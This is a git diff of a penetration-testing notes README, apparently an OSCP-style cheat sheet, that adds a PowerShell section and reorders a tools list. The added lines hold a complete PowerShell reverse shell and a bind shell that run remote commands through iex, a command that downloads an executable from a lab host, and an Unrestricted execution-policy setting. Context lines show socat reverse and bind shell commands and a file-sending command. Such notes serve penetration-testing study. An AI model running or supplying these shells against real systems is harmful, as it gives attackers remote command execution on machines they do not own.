@@ -24,10 +24,11 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Google Dorking](#google-dorking)
   - [GitHub Dorking](#github-dorking)
 - [Tools](#tools)
-  - [Burp Suite](#burp-suite)
   - [EasyG](#easyg)
+  - [Burp Suite](#burp-suite)
   - [Netcat](#netcat)
   - [Socat](#socat)
+  - [PowerShell](#powershell)
   - [Others](#others)
 - [Network](#network)
 - [Linux](#linux)
@@ -260,6 +261,23 @@ EasyG started out as a script that I use to automate some information gathering 
 
 ## Tools
 
+
+### <ins>EasyG</ins>
+
+[EasyG](easyg.rb) is a script that I use to automate some information gathering tasks for my hacking process. It uses: amass, subfinder, github-subdomains, gobuster, anew, httprobe and naabu.
+
+- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
+- [lists](lists/)
+  - [findtheevent.txt](lists/findtheevent.txt) and [findthetag.txt](lists/findthetag.txt) helps me test for XSS faster
+- [scripts](scripts/)
+  - [fg.rb](scripts/fg.rb) a copy of [tomnomnom/gf](https://github.com/tomnomnom/gf) made in ruby
+  - [nuclei_checks.rb](scripts/nuclei_checks.rb) perform some nuclei scans with a list of targets as an input
+  - [paramspider_support.rb](scripts/paramspider_support.rb) use paramspider with a list of targets as an input, delete duplicate results
+  - [selenium.rb](scripts/selenium.rb) take screenshots from a list of targets as an input
+  - [zip.py](scripts/zip.py) create custom zip files
+- [shells](shells/) to test file uploads
+
+
 ### <ins>Burp Suite</ins>
 
 - To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
@@ -300,22 +318,6 @@ EasyG started out as a script that I use to automate some information gathering 
   - [DotGit](https://github.com/davtur19/DotGit)
 
 
-### <ins>EasyG</ins>
-
-[EasyG](easyg.rb) is a script that I use to automate some information gathering tasks for my hacking process. It uses: amass, subfinder, github-subdomains, gobuster, anew, httprobe and naabu.
-
-- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
-- [lists](lists/)
-  - [findtheevent.txt](lists/findtheevent.txt) and [findthetag.txt](lists/findthetag.txt) helps me test for XSS faster
-- [scripts](scripts/)
-  - [fg.rb](scripts/fg.rb) a copy of [tomnomnom/gf](https://github.com/tomnomnom/gf) made in ruby
-  - [nuclei_checks.rb](scripts/nuclei_checks.rb) perform some nuclei scans with a list of targets as an input
-  - [paramspider_support.rb](scripts/paramspider_support.rb) use paramspider with a list of targets as an input, delete duplicate results
-  - [selenium.rb](scripts/selenium.rb) take screenshots from a list of targets as an input
-  - [zip.py](scripts/zip.py) create custom zip files
-- [shells](shells/) to test file uploads
-
-
 ### <ins>Netcat</ins>
 
 **Misc Commands**
@@ -342,6 +344,42 @@ socat TCP4:10.11.0.4:443 file:received_secret.txt,create                     Rec
 socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     Send a reverse shell
 socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
 socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
+```
+
+
+### <ins>PowerShell</ins>
+
+**Misc Commands**
+```
+Set-ExecutionPolicy Unrestricted                                                                                  Setting the PowerShell execution policy.
+Get-ExecutionPolicy                                                                                               Getting value for ExecutionPolicy.
+(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')    Download a file.
+powershell -c "command"                                                                                           The -c option will execute the supplied command as if it were typed at the PowerShell prompt.
+```
+
+
+**Send a reverse shell with PowerShell**
+- ```
+  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  ```
+- ```
+  $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+  $stream = $client.GetStream();
+  [byte[]]$bytes = 0..65535|%{0};
+  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+  	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+  	$sendback = (iex $data 2>&1 | Out-String );
+  	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  	$stream.Write($sendbyte,0,$sendbyte.Length);
+  	$stream.Flush();
+  }
+  $client.Close();
+  ```
+
+**Set up a bind shell with PowerShell**
+```
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
 
 
